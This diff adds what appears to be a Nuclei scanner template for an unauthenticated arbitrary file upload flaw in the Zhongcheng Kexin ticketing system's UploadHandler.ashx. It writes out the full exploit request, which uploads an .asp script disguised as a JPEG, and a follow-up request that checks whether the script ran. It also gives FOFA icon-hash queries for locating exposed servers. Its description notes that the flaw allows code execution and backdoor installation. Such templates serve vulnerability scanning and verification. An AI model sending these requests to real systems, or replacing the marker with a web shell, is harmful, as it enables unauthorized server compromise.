@@ -1,0 +1,42 @@
+http:
+    - raw:
+        - |
+          POST /WeChat/ashx/UploadHandler.ashx HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+          Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c8017b09eb305
+
+          --d0b7a0d40eed0e32904c8017b09eb305
+          Content-Disposition: form-data; name="file"; filename="{{username}}.asp"
+          Content-Type: image/jpeg
+
+          <% Response.Write("pboyjnnrfipmplsukdeczudsefxmywe") %>
+          --d0b7a0d40eed0e32904c8017b09eb305--
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - pboyjnnrfipmplsukdeczudsefxmywe
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /UploadImage/{{username}}.asp HTTP/1.1
+          Host: {{Hostname}}
+id: zhongchengkexin-UploadHandler_ashx-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: icon_hash="1632964065" || icon_hash="-2142050529"
+        中成科信票务管理系统 UploadHandler.ashx 任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 中成科信票务管理系统 UploadHandler.ashx 任意文件上传漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486730&idx=1&sn=7e13caad6f8bc8f6266b5cd30fb7a04b&chksm=c267b839f510312fc4e9826ac5295ab62daef36010e0c43d2ff164643313dd2907934ed1d73c&token=522460222&lang=zh_CN#rd
+    severity: high
+    tags:
+        - 中成科信票务管理系统
+        - 中成科信票务
+variables:
+    username: '{{to_lower(rand_base(6))}}'
